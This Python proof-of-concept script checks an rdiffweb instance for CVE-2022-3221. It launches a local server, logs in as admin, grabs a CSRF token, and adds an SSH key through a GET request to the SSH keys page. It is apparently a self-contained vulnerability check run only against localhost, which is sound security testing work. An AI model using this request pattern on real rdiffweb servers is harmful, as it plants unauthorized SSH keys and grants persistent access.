#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import random
import string
import subprocess
import time
import sys
import os
import shutil
import tempfile
from urllib.parse import urljoin

# --- Configuration ---
SERVER_LISTEN_HOST = "0.0.0.0"
CLIENT_CONNECT_HOST = "127.0.0.1"
PORT = 8000
TARGET_URL = f"http://{CLIENT_CONNECT_HOST}:{PORT}"
USERNAME = "admin"
PASSWORD = "admin123"


# --- Helper Functions ---
def print_info(message): print(f"[INFO] {message}")


def print_success(message): print(f"[SUCCESS] {message}")


def print_error(message): print(f"[ERROR] {message}")


def generate_random_string(length=8): return ''.join(
    random.choice(string.ascii_lowercase + string.digits) for i in range(length))


# --- PoC Logic ---
def check_vulnerability():
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
    })

    try:
        # Step 1: Login
        print_info("Attempting login...")
        login_page_url = urljoin(TARGET_URL, '/login/')  # With trailing slash

        session.get(login_page_url, timeout=10)

        login_payload = {
            'login': USERNAME,
            'password': PASSWORD,
            'redirect': '/'
        }

        r = session.post(login_page_url, data=login_payload, allow_redirects=True, timeout=10)

        if "Invalid username or password" in r.text or "login" in r.url:
            print_error("Login failed.")
            return False
        print_success("Login successful.")

        # Step 2: Get CSRF token from SSH keys page
        print_info("Fetching CSRF token from SSH keys page...")
        ssh_keys_url = urljoin(TARGET_URL, '/prefs/sshkeys')
        r = session.get(ssh_keys_url, timeout=10)
        csrf_token_add_key = re.search(r'name="csrf_token" value="([^"]+)"', r.text)
        if not csrf_token_add_key:
            print_error("Could not find CSRF token on SSH keys page.")
            return False
        print_success("Successfully fetched CSRF token.")

        # Step 3: Send malicious GET request with CSRF token
        print_info("Sending malicious GET request to add SSH key...")
        key_title = f"vuln-test-{generate_random_string()}"
        ssh_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQCzurRNVKwb0ZJCmUgGenoe4vth5gnHxgnzjHSUO8r7IZiouB6DAciiVUAryV6MQm5trwIXNo0QDwFxyX99exIwUlDu3OzhZHKKbb721hCID17AWZMAQIgxQdu6b27s5YgJXsaxXWvEO2lSRVOnVXoCSI7mK5St/CJ8O1OdXivNIQ== poc-key"
        exploit_params = {'action': 'add', 'title': key_title, 'key': ssh_key,
                          'csrf_token': csrf_token_add_key.group(1)}
        session.get(ssh_keys_url, params=exploit_params, timeout=10)

        # Step 4: Verify if the key was added
        print_info(f"Verifying if key '{key_title}' was added...")
        r_verify = session.get(ssh_keys_url, timeout=10)
        return key_title in r_verify.text

    except requests.exceptions.RequestException as e:
        print_error(f"A network error occurred: {e}")
        return False


# --- Main Execution ---
if __name__ == '__main__':
    web_server_process = None
    exit_code = 1

    db_file_handle = tempfile.NamedTemporaryFile(suffix=".db", delete=False)
    db_path = db_file_handle.name
    db_uri = f"sqlite:///{db_path}"
    db_file_handle.close()

    try:
        # Phase 1: Start rdiffweb service
        print_info("--- PHASE 1: Starting rdiffweb service ---")
        server_command = [
            "rdiffweb", "--database-uri", db_uri, "--server-host", SERVER_LISTEN_HOST,
            "--server-port", str(PORT), "--admin-user", USERNAME, "--admin-password", PASSWORD,
            "--rate-limit", "0"
        ]

        print_info(f"Executing command: {' '.join(server_command)}")
        web_server_process = subprocess.Popen(
            server_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        # Phase 2: Wait for service to be ready
        print_info("--- PHASE 2: Waiting for service to be ready ---")
        wait_time = 15
        print_info(f"Fixed wait for {wait_time} seconds for server warm-up...")
        time.sleep(wait_time)

        print_info(f"Checking network connectivity with curl: curl {TARGET_URL}/login/")
        curl_check = subprocess.run(["curl", "-sf", "-o", "/dev/null", f"{TARGET_URL}/login/"], timeout=5)
        if curl_check.returncode == 0:
            print_success("curl connection successful! Service is confirmed to be ready.")
            server_ready = True
        else:
            print_error(f"curl connection failed with exit code: {curl_check.returncode}.")
            server_ready = False
            raise RuntimeError("Could not connect to the server via curl.")

        # Phase 3: Execute vulnerability check
        print_info("--- PHASE 3: Executing vulnerability check ---")
        is_vulnerable = check_vulnerability()

        # Phase 4: Final Conclusion
        print_info("--- PHASE 4: Final Conclusion ---")
        if is_vulnerable:
            print_success("CONCLUSION: Target is VULNERABLE to CVE-2022-3221.")
            exit_code = 0
        else:
            print_error("CONCLUSION: Target does not appear to be vulnerable.")

    except Exception as e:
        print_error(f"An unexpected error occurred: {e}")
    finally:
        # Phase 5: Cleanup
        print_info("--- PHASE 5: Cleaning up ---")
        if web_server_process:
            print_info(f"Terminating rdiffweb service (PID: {web_server_process.pid})...")
            web_server_process.terminate()
            try:
                stdout, stderr = web_server_process.communicate(timeout=10)
                print_success("Service terminated.")
                # Print logs only if the script failed, for brevity
                if exit_code != 0:
                    print("\n--- Server STDOUT ---\n" + (stdout or "Not available."))
                    print("\n--- Server STDERR ---\n" + (stderr or "Not available."))
            except subprocess.TimeoutExpired:
                print_error("Service did not terminate gracefully, forcing kill.")
                web_server_process.kill()

        if os.path.exists(db_path):
            print_info(f"Deleting temporary database file: {db_path}")
            os.remove(db_path)

        print_info("Automated check finished.")
        sys.exit(exit_code)